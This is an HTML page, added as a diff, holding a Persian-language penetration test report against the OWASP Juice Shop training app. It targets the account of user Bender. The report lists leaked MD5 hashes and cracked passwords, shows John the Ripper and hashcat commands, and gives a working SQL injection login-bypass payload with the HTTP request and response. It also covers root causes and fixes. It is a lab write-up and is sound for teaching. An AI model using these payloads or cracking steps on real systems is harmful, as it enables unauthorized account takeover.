@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>گزارش تست نفوذ کامل - OWASP Juice Shop</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --success: #27ae60;
+            --warning: #f39c12;
+            --danger: #e74c3c;
+            --bg: #f5f6fa;
+            --card-bg: #ffffff;
+            --text: #333333;
+            --border: #e0e0e0;
+            --code-bg: #282c34;
+            --code-text: #abb2bf;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: var(--card-bg);
+            border-radius: 15px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .header .subtitle {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .section {
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: #fafafa;
+        }
+        
+        .section-title {
+            font-size: 1.5em;
+            color: var(--primary);
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid var(--secondary);
+            font-weight: 700;
+        }
+        
+        .sub-section {
+            margin: 15px 0;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            border-right: 4px solid var(--secondary);
+        }
+        
+        .severity-critical {
+            display: inline-block;
+            background: var(--danger);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        
+        .severity-high {
+            display: inline-block;
+            background: var(--warning);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.85em;
+            font-weight: 600;
+            margin: 2px;
+        }
+        
+        .badge-success {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .badge-danger {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .badge-info {
+            background: #d1ecf1;
+            color: #0c5460;
+        }
+        
+        .badge-warning {
+            background: #fff3cd;
+            color: #856404;
+        }
+        
+        code {
+            background: var(--code-bg);
+            color: #e6c07b;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', Consolas, monospace;
+            font-size: 0.9em;
+            direction: ltr;
+            display: inline-block;
+        }
+        
+        .code-block {
+            background: var(--code-bg);
+            color: var(--code-text);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 15px 0;
+            direction: ltr;
+            font-family: 'Courier New', Consolas, monospace;
+            font-size: 0.9em;
+            line-height: 1.6;
+        }
+        
+        .code-block .comment {
+            color: #5c6370;
+            font-style: italic;
+        }
+        
+        .code-block .string {
+            color: #98c379;
+        }
+        
+        .code-block .keyword {
+            color: #c678dd;
+        }
+        
+        .code-block .function {
+            color: #61afef;
+        }
+        
+        .code-block .number {
+            color: #d19a66;
+        }
+        
+        .timeline {
+            position: relative;
+            padding-right: 30px;
+        }
+        
+        .timeline::before {
+            content: '';
+            position: absolute;
+            right: 10px;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background: var(--secondary);
+            border-radius: 3px;
+        }
+        
+        .timeline-item {
+            position: relative;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+        
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            right: -25px;
+            top: 20px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--secondary);
+            border: 3px solid white;
+            box-shadow: 0 0 0 2px var(--secondary);
+        }
+        
+        .timeline-item.success::before {
+            background: var(--success);
+            box-shadow: 0 0 0 2px var(--success);
+        }
+        
+        .timeline-item.failure::before {
+            background: var(--danger);
+            box-shadow: 0 0 0 2px var(--danger);
+        }
+        
+        .timeline-item.info::before {
+            background: var(--secondary);
+            box-shadow: 0 0 0 2px var(--secondary);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            background: white;
+        }
+        
+        table th, table td {
+            padding: 12px;
+            text-align: right;
+            border: 1px solid var(--border);
+        }
+        
+        table th {
+            background: var(--primary);
+            color: white;
+            font-weight: 600;
+        }
+        
+        table tr:nth-child(even) {
+            background: #f8f9fa;
+        }
+        
+        .alert {
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: 500;
+        }
+        
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .alert-danger {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .alert-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .alert-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+        }
+        
+        .hash-display {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 1.1em;
+            letter-spacing: 2px;
+            text-align: center;
+            direction: ltr;
+            border: 2px dashed var(--border);
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid var(--border);
+        }
+        
+        .stat-card .number {
+            font-size: 2em;
+            font-weight: 700;
+            color: var(--secondary);
+        }
+        
+        .stat-card .label {
+            font-size: 0.9em;
+            color: #666;
+        }
+        
+        .footer {
+            background: var(--primary);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9em;
+        }
+        
+        @media print {
+            body {
+                background: white;
+                padding: 0;
+            }
+            .container {
+                box-shadow: none;
+                border-radius: 0;
+            }
+            .section {
+                break-inside: avoid;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- هدر -->
+        <div class="header">
+            <h1>🔒 گزارش کامل تست نفوذ</h1>
+            <div class="subtitle">OWASP Juice Shop - دسترسی به حساب کاربر Bender</div>
+            <div style="margin-top: 15px;">
+                <span class="badge badge-warning" style="font-size: 1em;">CVSS: 9.8 (Critical)</span>
+                <span class="badge badge-danger" style="font-size: 1em;">SQL Injection</span>
+            </div>
+        </div>
+        
+        <div class="content">
+            <!-- اطلاعات کلی -->
+            <div class="section">
+                <h2 class="section-title">📋 اطلاعات کلی</h2>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="number">🎯</div>
+                        <div class="label">هدف: OWASP Juice Shop</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="number">👤</div>
+                        <div class="label">کاربر هدف: Bender</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="number">📅</div>
+                        <div class="label">تاریخ: 5 سپتامبر 2026</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="number">🔧</div>
+                        <div class="label">ابزار: Burp Suite + John + Hashcat</div>
+                    </div>
+                </div>
+                
+                <table>
+                    <tr>
+                        <th>عنوان</th>
+                        <th>جزئیات</th>
+                    </tr>
+                    <tr>
+                        <td><strong>نوع تست</strong></td>
+                        <td>تست نفوذ برنامه تحت وب</td>
+                    </tr>
+                    <tr>
+                        <td><strong>هدف</strong></td>
+                        <td>دسترسی غیرمجاز به حساب کاربر Bender</td>
+                    </tr>
+                    <tr>
+                        <td><strong>نتیجه</strong></td>
+                        <td><span class="badge badge-success">✅ موفق</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>روش نهایی</strong></td>
+                        <td>SQL Injection - Authentication Bypass</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <!-- تایم‌لاین مراحل -->
+            <div class="section">
+                <h2 class="section-title">🕐 تایم‌لاین کامل مراحل تست</h2>
+                <div class="timeline">
+                    <!-- مرحله 1 -->
+                    <div class="timeline-item info">
+                        <h3>مرحله ۱: شناسایی اولیه و جمع‌آوری اطلاعات</h3>
+                        <p>شروع تست با شناسایی ساختار برنامه و کاربر هدف:</p>
+                        <ul>
+                            <li>شناسایی کاربر هدف: <code>Bender</code></li>
+                            <li>شناسایی ایمیل: <code>bender@juice-sh.op</code></li>
+                            <li>شناسایی فرم لاگین در مسیر <code>/rest/user/login</code></li>
+                        </ul>
+                    </div>
+                    
+                    <!-- مرحله 2 -->
+                    <div class="timeline-item info">
+                        <h3>مرحله ۲: استخراج هش‌های پسورد از دیتابیس</h3>
+                        <p>با استفاده از SQL Injection اولیه، اطلاعات کاربران از دیتابیس استخراج شد:</p>
+                        
+                        <table>
+                            <tr>
+                                <th>کاربر</th>
+                                <th>ایمیل</th>
+                                <th>هش پسورد</th>
+                                <th>وضعیت</th>
+                            </tr>
+                            <tr>
+                                <td>Admin</td>
+                                <td>admin@juice-sh.op</td>
+                                <td><code>0192023a7bbd73250516f069df18b500</code></td>
+                                <td><span class="badge badge-success">کرک شد</span></td>
+                            </tr>
+                            <tr>
+                                <td>Jim</td>
+                                <td>jim@juice-sh.op</td>
+                                <td><code>e541ca7ecf72b8d1286474fc613e5e45</code></td>
+                                <td><span class="badge badge-success">کرک شد</span></td>
+                            </tr>
+                            <tr>
+                                <td><strong>Bender</strong></td>
+                                <td><strong>bender@juice-sh.op</strong></td>
+                                <td><strong><code>0c36e517e3fa95aabf1bbffc6744a4ef</code></strong></td>
+                                <td><span class="badge badge-danger">کرک ناموفق</span></td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <!-- مرحله 3 -->
+                    <div class="timeline-item success">
+                        <h3>مرحله ۳: کرک موفق هش‌های سایر کاربران</h3>
+                        <p>سه هش از کاربران دیگر با موفقیت کرک شدند:</p>
+                        
+                        <div class="alert alert-success">
+                            <strong>✅ پسوردهای کرک شده:</strong>
+                            <ul>
+                                <li><code>admin123</code> - برای کاربر Admin</li>
+                                <li><code>ncc-1701</code> - برای کاربر Jim (اشاره به شماره سفینه Enterprise در Star Trek)</li>
+                                <li><code>private</code> - برای کاربر دیگر</li>
+                            </ul>
+                        </div>
+                        
+                        <p>🔍 <strong>تحلیل الگو:</strong></p>
+                        <ul>
+                            <li>پسورد <code>ncc-1701</code> نشان می‌دهد که کاربران از ارجاعات فرهنگ عامه استفاده می‌کنند</li>
+                            <li>این سرنخ مهمی برای حدس پسورد Bender بود</li>
+                        </ul>
+                    </div>
+                    
+                    <!-- مرحله 4 -->
+                    <div class="timeline-item failure">
+                        <h3>مرحله ۴: تلاش برای کرک هش Bender</h3>
+                        <p>چندین روش برای کرک هش <code>0c36e517e3fa95aabf1bbffc6744a4ef</code> امتحان شد:</p>
+                        
+                        <div class="sub-section">
+                            <h4>🔴 تلاش ۱: کرک استیشن (CrackStation)</h4>
+                            <p>نتیجه: <span class="badge badge-danger">❌ ناموفق</span></p>
+                        </div>
+                        
+                        <div class="sub-section">
+                            <h4>🔴 تلاش ۲: John the Ripper با rockyou.txt</h4>
+                            <div class="code-block">
+                                <span class="comment"># اجرای John با وردلیست rockyou</span>
+                                john --format=raw-md5 --wordlist=rockyou.txt hash.txt
+                                
+                                <span class="comment"># خروجی:</span>
+                                0g 0:00:00:04 DONE (2026-09-05 19:03) 0g/s 2874Kp/s
+                                fuckyooh21..*7¡Vamos!
+                            </div>
+                            <p>نتیجه: <span class="badge badge-danger">❌ ناموفق</span></p>
+                        </div>
+                        
+                        <div class="sub-section">
+                            <h4>🔴 تلاش ۳: John the Ripper با rules</h4>
+                            <div class="code-block">
+                                <span class="comment"># اجرای John با قوانین (rules)</span>
+                                john --format=raw-md5 --wordlist=rockyou.txt --rules hash.txt
+                                
+                                <span class="comment"># خروجی:</span>
+                                0g 0:00:02:17 DONE (2026-09-05 19:20)
+                                Aarlovering..Aaaaaaaaaaaaing
+                            </div>
+                            <p>نتیجه: <span class="badge badge-danger">❌ ناموفق</span></p>
+                        </div>
+                        
+                        <div class="sub-section">
+                            <h4>🔴 تلاش ۴: Google Colab با GPU</h4>
+                            <p>تلاش برای استفاده از GPU رایگان Google Colab برای کرک سریعتر:</p>
+                            <div class="code-block">
+                                <span class="comment"># خطای حافظه GPU در Colab</span>
+                                Device #1: Not enough allocatable device memory
+                            </div>
+                            <p>نتیجه: <span class="badge badge-danger">❌ ناموفق - خطای حافظه</span></p>
+                        </div>
+                        
+                        <div class="sub-section">
+                            <h4>🔴 تلاش ۵: Hashcat با CPU در Colab</h4>
+                            <div class="code-block">
+                                <span class="comment"># اجرای hashcat با CPU</span>
+                                hashcat -m 0 -a 0 hash.txt rockyou.txt --force -O -w 1 --opencl-device-types 1
+                            </div>
+                            <p>نتیجه: <span class="badge badge-danger">❌ ناموفق</span></p>
+                        </div>
+                    </div>
+                    
+                    <!-- مرحله 5 -->
+                    <div class="timeline-item info">
+                        <h3>مرحله ۵: تحلیل سرنخ‌های چالش</h3>
+                        <p>با بررسی دقیق سرنخ‌های چالش، مسیر درست مشخص شد:</p>
+                        
+                        <div class="alert alert-info">
+                            <strong>🔍 سرنخ‌های مهم:</strong>
+                            <ol>
+                                <li>توضیح چالش نشان می‌دهد که باید به چه شکلی حمله شود</li>
+                                <li>باید ایمیل Bender را حدس بزنیم یا بدانیم</li>
+                                <li><strong>هش پسورد Bender خیلی به درد نمی‌خورد</strong></li>
+                                <li>اگر از روشی غیر از SQL Injection استفاده شود، متوجه می‌شویم که هش Bender کاربردی ندارد</li>
+                            </ol>
+                        </div>
+                        
+                        <div class="alert alert-warning">
+                            <strong>💡 نتیجه‌گیری:</strong>
+                            <p>مسیر درست، کرک کردن هش نیست! باید از <strong>SQL Injection</strong> برای دور زدن احراز هویت استفاده شود.</p>
+                        </div>
+                    </div>
+                    
+                    <!-- مرحله 6 -->
+                    <div class="timeline-item success">
+                        <h3>مرحله ۶: حمله SQL Injection موفق</h3>
+                        <p>با استفاده از SQL Injection در فرم لاگین، احراز هویت دور زده شد:</p>
+                        
+                        <div class="sub-section">
+                            <h4>🚀 Payload استفاده شده:</h4>
+                            <div class="code-block">
+                                <span class="comment">// درخواست HTTP</span>
+                                POST /rest/user/login HTTP/1.1
+                                Host: target.com
+                                Content-Type: application/json
+                                
+                                {
+                                  <span class="string">"email"</span>: <span class="string">"bender@juice-sh.op' OR 1=1--"</span>,
+                                  <span class="string">"password"</span>: <span class="string">"anything"</span>
+                                }
+                            </div>
+                        </div>
+                        
+                        <div class="sub-section">
+                            <h4>🔍 تحلیل کوئری SQL:</h4>
+                            <div class="code-block">
+                                <span class="comment">// کوئری اصلی</span>
+                                <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Users
+                                <span class="keyword">WHERE</span> email = <span class="string">'bender@juice-sh.op'</span> <span class="keyword">AND</span> password = <span class="string">'...'</span>
+                                
+                                <span class="comment">// کوئری پس از تزریق</span>
+                                <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Users
+                                <span class="keyword">WHERE</span> email = <span class="string">'bender@juice-sh.op'</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span>--<span class="string">' AND password = 'anything'</span>
+                            </div>
+                        </div>
+                        
+                        <div class="sub-section">
+                            <h4>📥 پاسخ سرور:</h4>
+                            <div class="code-block">
+                                HTTP/1.1 200 OK
+                                Content-Type: application/json
+                                
+                                {
+                                  <span class="string">"authentication"</span>: {
+                                    <span class="string">"token"</span>: <span class="string">"eyJhbGciOiJSUzI1NiIs..."</span>,
+                                    <span class="string">"bid"</span>: <span class="number">1</span>,
+                                    <span class="string">"umail"</span>: <span class="string">"bender@juice-sh.op"</span>
+                                  }
+                                }
+                            </div>
+                        </div>
+                        
+                        <div class="alert alert-success">
+                            <strong>✅ نتیجه: ورود موفقیت‌آمیز به حساب Bender!</strong>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- جزئیات فنی -->
+            <div class="section">
+                <h2 class="section-title">🔬 جزئیات فنی آسیب‌پذیری</h2>
+                
+                <div class="sub-section">
+                    <h3>مشخصات آسیب‌پذیری</h3>
+                    <table>
+                        <tr>
+                            <td><strong>نام</strong></td>
+                            <td>SQL Injection - Authentication Bypass</td>
+                        </tr>
+                        <tr>
+                            <td><strong>CWE</strong></td>
+                            <td>CWE-89 (SQL Injection), CWE-287 (Authentication Bypass)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>CVSS v3.1</strong></td>
+                            <td><span class="severity-critical">9.8 (Critical)</span></td>
+                        </tr>
+                        <tr>
+                            <td><strong>مسیر آسیب‌پذیر</strong></td>
+                            <td><code>/rest/user/login</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>پارامتر آسیب‌پذیر</strong></td>
+                            <td><code>email</code></td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <div class="sub-section">
+                    <h3>تأثیر (Impact)</h3>
+                    <ul>
+                        <li>🔓 دور زدن کامل احراز هویت</li>
+                        <li>👤 دسترسی به حساب هر کاربر بدون نیاز به پسورد</li>
+                        <li>📧 دسترسی به اطلاعات حساس کاربران</li>
+                        <li>🎫 دریافت توکن JWT معتبر برای جعل هویت</li>
+                        <li>⚡ در صورت وجود کاربر ادمین، تسلط کامل بر برنامه</li>
+                    </ul>
+                </div>
+                
+                <div class="sub-section">
+                    <h3>علت ریشه‌ای</h3>
+                    <p>برنامه مقادیر ورودی کاربر را بدون استفاده از Prepared Statements یا Parameterized Queries مستقیماً در کوئری SQL قرار می‌دهد.</p>
+                    
+                    <div class="code-block">
+                        <span class="comment">// کد آسیب‌پذیر (نمونه)</span>
+                        <span class="keyword">const</span> query = <span class="string">`SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${req.body.password}'`</span>;
+                        
+                        <span class="comment">// کد امن (با استفاده از Parameterized Query)</span>
+                        <span class="keyword">const</span> query = <span class="string">'SELECT * FROM Users WHERE email = ? AND password = ?'</span>;
+                        db.query(query, [req.body.email, req.body.password]);
+                    </div>
+                </div>
+            </div>
+            
+            <!-- ابزارهای استفاده شده -->
+            <div class="section">
+                <h2 class="section-title">🛠️ ابزارهای استفاده شده</h2>
+                <table>
+                    <tr>
+                        <th>ابزار</th>
+                        <th>کاربرد</th>
+                        <th>نتیجه</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Burp Suite</strong></td>
+                        <td>تحلیل و دستکاری درخواست‌های HTTP</td>
+                        <td><span class="badge badge-success">موفق</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>John the Ripper</strong></td>
+                        <td>کرک هش‌های MD5 با وردلیست rockyou</td>
+                        <td><span class="badge badge-warning">موفق برای 3 کاربر</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>CrackStation</strong></td>
+                        <td>جستجوی آنلاین هش در دیتابیس</td>
+                        <td><span class="badge badge-danger">ناموفق برای Bender</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Google Colab</strong></td>
+                        <td>استفاده از GPU رایگان برای کرک</td>
+                        <td><span class="badge badge-danger">خطای حافظه</span></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Hashcat</strong></td>
+                        <td>کرک هش با CPU</td>
+                        <td><span class="badge badge-danger">ناموفق برای Bender</span></td>
+                    </tr>
+                </table>
+            </div>
+            
+            <!-- راه‌حل‌ها -->
+            <div class="section">
+                <h2 class="section-title">🛡️ راه‌حل‌های پیشنهادی</h2>
+                
+                <div class="sub-section">
+                    <h3>۱. استفاده از Prepared Statements</h3>
+                    <div class="code-block">
+                        <span class="comment">// Node.js با Sequelize ORM</span>
+                        User.findOne({
+                          where: {
+                            email: req.body.email,
+                            password: hash(req.body.password)
+                          }
+                        });
+                    </div>
+                </div>
+                
+                <div class="sub-section">
+                    <h3>۲. اعتبارسنجی ورودی</h3>
+                    <ul>
+                        <li>اعتبارسنجی ایمیل با Regular Expression</li>
+                        <li>رد کردن کاراکترهای خاص: <code>'</code>، <code>"</code>، <code>--</code>، <code>;</code></li>
+                        <li>محدود کردن طول ورودی</li>
+                    </ul>
+                </div>
+                
+                <div class="sub-section">
+                    <h3>۳. حداقل‌سازی دسترسی دیتابیس</h3>
+                    <ul>
+                        <li>استفاده از کاربر دیتابیس با حداقل دسترسی</li>
+                        <li>غیرفعال کردن پیام‌های خطای دیتابیس در محیط production</li>
+                    </ul>
+                </div>
+                
+                <div class="sub-section">
+                    <h3>۴. استفاده از WAF</h3>
+                    <ul>
+                        <li>استقرار Web Application Firewall برای شناسایی حملات SQL Injection</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- جمع‌بندی -->
+            <div class="section">
+                <h2 class="section-title">📝 جمع‌بندی نهایی</h2>
+                
+                <div class="alert alert-success">
+                    <strong>✅ نتیجه تست:</strong>
+                    <p>در ابتدا تلاش شد با کرک کردن هش MD5 پسورد کاربر Bender به حساب او دسترسی پیدا شود. با وجود تلاش‌های متعدد با ابزارهای مختلف (CrackStation، John the Ripper، Hashcat و Google Colab)، این روش موفق نبود.</p>
+                    <br>
+                    <p>با تحلیل دقیق سرنخ‌های چالش، مشخص شد که مسیر درست استفاده از <strong>SQL Injection</strong> برای دور زدن احراز هویت است. با تزریق payload مناسب در پارامتر <code>email</code>، احراز هویت با موفقیت دور زده شد و دسترسی به حساب Bender به دست آمد.</p>
+                </div>
+                
+                <div class="alert alert-warning">
+                    <strong>⚠️ نکته مهم:</strong>
+                    <p>این تست فقط در محیط تمرینی OWASP Juice Shop انجام شده است. هرگونه تست نفوذ بر روی سیستم‌های واقعی بدون مجوز کتبی غیرقانونی است.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- فوتر -->
+        <div class="footer">
+            <p>📋 گزارش تست نفوذ | OWASP Juice Shop | سپتامبر 2026</p>
+            <p style="margin-top: 5px;">🔒 این گزارش فقط برای اهداف آموزشی و مستندسازی تهیه شده است.</p>
+        </div>
+    </div>
+</body>
+</html>
